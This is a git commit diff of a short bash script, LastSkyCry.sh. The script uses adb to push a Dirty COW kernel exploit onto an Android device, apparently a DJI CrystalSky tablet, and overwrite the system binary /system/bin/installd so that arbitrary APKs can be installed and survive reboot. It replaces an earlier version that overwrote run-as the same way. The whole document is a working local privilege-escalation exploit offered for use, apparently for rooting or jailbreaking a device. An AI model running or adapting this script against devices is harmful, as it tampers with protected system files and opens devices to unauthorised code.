f5906d86cc51c40d0e0d5dbcc17011ad673dfd8b
MAVProxyUser <kf@digitalmunition.com>
2017-08-31 17:24:19 -0400

    Add Temporal installd patch. APKs will remain after reboot

--- LastSkyCry.sh
+++ LastSkyCry.sh
@@ -1,11 +1,8 @@
 #!/bin/bash
 
 adb push dirtycow /data/local/tmp/dirtycow
-adb push run-as /data/local/tmp/run-as
-adb push SlackOGCrystalSkyLove.sh /data/local/tmp/SlackOGCrystalSkyLove.sh
-adb shell 'chmod 755 /data/local/tmp/SlackOGCrystalSkyLove.sh'
+adb push installd /data/local/tmp/installd
 echo "Running exploit, may take some time"
-
-adb shell 'chmod 777 /data/local/tmp/run-as'
-adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
-adb shell /system/bin/run-as
+adb shell 'chmod 777 /data/local/tmp/installd'
+adb shell '/data/local/tmp/dirtycow /system/bin/installd /data/local/tmp/installd'
+echo "Install what ever you want now via 'adb install'
